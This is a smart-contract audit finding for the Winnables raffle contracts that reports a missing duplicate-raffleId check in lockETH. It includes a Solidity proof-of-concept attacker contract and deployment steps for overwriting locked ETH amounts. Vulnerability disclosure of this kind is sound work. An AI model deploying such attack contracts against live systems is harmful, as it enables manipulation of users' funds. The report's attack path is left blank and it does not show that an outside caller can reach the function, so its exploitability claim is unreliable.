# No Check for Duplicate raffleId at WinnablesPrizeManager contract

### Summary

Line: https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/contracts/WinnablesPrizeManager.sol#L178

If the raffleId is not unique, calling this function multiple times with the same raffleId could lead to overwriting the existing raffle prize. This could cause confusion or even allow a malicious user to manipulate the raffle system by changing the locked ETH amount for a previously set raffle.

### Root Cause

Duplicate raffleID check missing.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

This could cause confusion or even allow a malicious user to manipulate the raffle system by changing the locked ETH amount for a previously set raffle.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./WinnablesPrizeManager.sol"; // Import the vulnerable contract

contract PoCAttacker {
    WinnablesPrizeManager public targetContract;

    constructor(address _targetAddress) {
        targetContract = WinnablesPrizeManager(_targetAddress);
    }

    // Function to perform the attack by calling lockETH multiple times with the same raffleId
    function attack(uint256 raffleId, uint256 firstAmount, uint256 secondAmount) external payable {
        require(msg.value == firstAmount + secondAmount, "Insufficient ETH sent");

        // First call to lockETH with the raffleId
        targetContract.lockETH{value: firstAmount}(address(this), 1, raffleId, firstAmount);

        // Second call to lockETH with the same raffleId, overwriting the first locked amount
        targetContract.lockETH{value: secondAmount}(address(this), 1, raffleId, secondAmount);
    }

    // Fallback function to receive ETH if needed
    receive() external payable {}
}
```
Vulnerable Contract Reference: The PoC imports the WinnablesPrizeManager contract (the vulnerable contract). This allows the PoC to interact directly with the vulnerable lockETH function.

**attack Function:**

The attack function is designed to call the lockETH function on the target contract twice with the same raffleId.
It accepts the raffleId, firstAmount, and secondAmount as parameters. It also requires that the caller sends enough ETH to cover both amounts.
The first call to lockETH locks an initial amount of ETH with the given raffleId.
The second call to lockETH uses the same raffleId but locks a different amount, effectively overwriting the previous ETH lock.
**Demonstration:**

Deploy the WinnablesPrizeManager contract.
Deploy this PoC contract, passing the address of the WinnablesPrizeManager contract to the constructor.
Call the attack function with a specific raffleId and two different ETH amounts.
Observe that the second call overwrites the ETH locked for the raffleId in the vulnerable contract.

**Expected Outcome:**
After running this PoC, you should see that the _ethRaffles mapping for the given raffleId in the WinnablesPrizeManager contract only contains the secondAmount, demonstrating that the first locked amount was overwritten by the second call.
This PoC highlights the vulnerability in allowing multiple lockETH calls with the same raffleId, which could be exploited by an attacker to manipulate the locked ETH amounts.

### Mitigation

Implement a check to ensure that the raffleId has not been used before to avoid overwriting existing raffle prizes.
